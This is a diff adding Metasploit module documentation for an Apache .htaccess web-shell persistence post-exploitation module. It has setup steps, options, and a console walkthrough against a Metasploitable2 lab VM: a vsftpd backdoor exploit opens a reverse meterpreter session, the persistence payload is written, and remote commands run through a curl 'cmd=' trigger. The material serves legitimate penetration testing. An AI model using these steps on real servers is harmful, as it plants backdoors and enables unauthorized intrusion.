@@ -1,0 +1,93 @@
+## Vulnerable Application
+
+This module targets Linux systems running Apache web server with
+.htaccess support enabled (AllowOverride All). The module uses
+Apache's mod_cgi to embed a shell payload directly into an
+.htaccess file, based on the [htshells project](https://github.com/wireghoul/htshells).
+
+Requirements:
+- Apache web server running on target
+- Write access to an .htaccess file
+- mod_cgi available on target (module will attempt to enable it)
+
+Tested against:
+- Metasploitable2 (Ubuntu, Apache 2.2.8)
+
+## Verification Steps
+
+1. Get a session on the target (shell or meterpreter)
+1. Start `msfconsole`
+1. Do: `use post/linux/manage/apache_htaccess_persistence`
+1. Do: `set SESSION <session_id>`
+1. Do: `set HTACCESS_PATH /var/www/.htaccess`
+1. Do: `run`
+1. Verify with: `curl "http://TARGET/.htaccess?cmd=whoami"`
+1. You should see `www-data` or the Apache user
+
+## Options
+
+### HTACCESS_PATH
+
+Full path to the .htaccess file on the target to write the
+persistence payload into. The file must already exist and be
+writable. (Default: `/var/www/.htaccess`)
+
+### RESTART_APACHE
+
+Boolean option to restart Apache after enabling mod_cgi.
+Restarting Apache may be noticed by monitoring systems.
+(Default: `true`)
+
+### SESSION
+
+Which session to use, which can be viewed with `sessions -l`.
+
+## Scenarios
+
+### Metasploitable2 (Ubuntu, Apache 2.2.8)
+
+```
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.112
+RHOSTS => 192.168.1.112
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.1.121
+LHOST => 192.168.1.121
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] Started reverse TCP handler on 192.168.1.121:4444
+[+] 192.168.1.112:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened
+
+meterpreter > background
+
+msf > use post/linux/manage/apache_htaccess_persistence
+msf post(linux/manage/apache_htaccess_persistence) > set SESSION 1
+SESSION => 1
+msf post(linux/manage/apache_htaccess_persistence) > set HTACCESS_PATH /var/www/.htaccess
+HTACCESS_PATH => /var/www/.htaccess
+msf post(linux/manage/apache_htaccess_persistence) > run
+
+[*] Backing up /var/www/.htaccess to loot...
+[+] Backup saved to: /root/.msf4/loot/htaccess.backup.txt
+[*] Checking Apache modules...
+[*] Enabling mod_cgi...
+[*] Restarting Apache...
+[+] Apache restarted!
+[*] Writing payload to /var/www/.htaccess
+[+] Payload written!
+[+] Persistence deployed!
+[*] Trigger: curl 'http://TARGET/.htaccess?cmd=whoami'
+[*] Post module execution completed
+
+$ curl "http://192.168.1.112/.htaccess?cmd=whoami"
+$ whoami
+www-data
+
+$ curl "http://192.168.1.112/.htaccess?cmd=id"
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ curl "http://192.168.1.112/.htaccess?cmd=uname%20-a"
+$ uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+```
